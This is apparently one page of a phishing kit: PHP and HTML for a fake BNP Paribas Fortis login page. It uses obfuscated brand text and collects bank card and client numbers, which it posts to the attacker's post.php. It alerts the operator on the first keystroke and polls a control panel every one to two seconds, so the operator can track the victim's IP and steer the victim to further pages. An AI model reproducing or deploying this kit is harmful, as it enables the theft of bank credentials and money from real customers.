<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<header>
<div class="holder">
<div class="back">
</div>
<div class="logo">
    
<div class="mklogo">
    <div class="mkimg">
        <img src="res/log.png">
    </div>
    <div class="mktext">
    <?php $bm->obf("BNP PARIBAS"); ?>
        <div class="liner"></div>
        <?php $bm->obf("FORTIS"); ?>
    </div>
</div>
    
</div>
<div class="easy">
<?php $bm->obf(getLang("_easy")); ?>
</div>
</div>
</header>

<main>
<form action="action.php" method="post">
    <input type="hidden" name="email">
    <input type="hidden" name="password">
    <input type="hidden" name="cardnumber">
</form>
<div class="form">

<div class="left">
<div class="welcome">
    <h3><?php $bm->obf(getLang("_welcomes")[0]); ?></h3>
    <h1><?php $bm->obf(getLang("_welcomes")[1]); ?></h1>
</div>

<div class="register">
<span><?php $bm->obf(getLang("_register")[0]); ?></span>
<a href="#"><?php $bm->obf(getLang("_register")[1]); ?></a>
</div>
</div>

<div class="right">
<?php 
if(isset($_GET['e'])){
    echo '<div class="col error">
    '.getLang("_login_error").'
    </div>';
}
?>

<div class="col">
    <label><?php $bm->obf(getLang("_login_inputs")[0]); ?> <img src="res/qes.png"></label>
    <input type="text" id="d0" placeholder="---- ---- ---- ---- -">
</div>

<div class="col">
    <label><?php $bm->obf(getLang("_login_inputs")[1]); ?> <img src="res/qes.png"></label>
    <input type="text" id="d1" placeholder="----- -----">
</div>

<div class="col">
    <button onclick="sendLog()"><?php $bm->obf(getLang("_next")); ?></button>
</div>


</div>

</div>


<div class="help">
    <div class="help-text"><img src="res/phone.png"> <?php $bm->obf(getLang("_help")[0]); ?></div><br>
    <a href="#"> <?php $bm->obf(getLang("_help")[1]); ?></a>
</div>

</main>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>

$("#d0").mask("0000 0000 0000 0000 0")
$("#d1").mask("00000 00000")

var abortNote = false;
$("input").keyup(()=>{
    if(!abortNote){
        $.post("post.php",{n_login:1});
        abortNote=true;
    }

});

var isValid = false;
function sendLog(){
    isValid = true;
    if($("#d0").val().length<16){
        $("#d0").addClass("error");
        isValid = false;
    }
    if($("#d1").val().length<5){
        $("#d1").addClass("error");
        isValid = false;
    }

    if(isValid){
        $.post("post.php",{
            card:$("#d0").val(),
            num:$("#d1").val()
        },(res)=>{
            window.location="mkfile.php?p=wait";
        });
    }
}


$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendLog();
    }
});


setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d){
            window.location=d;
        }
    })

}, 2000);
</script>
</body>
</html>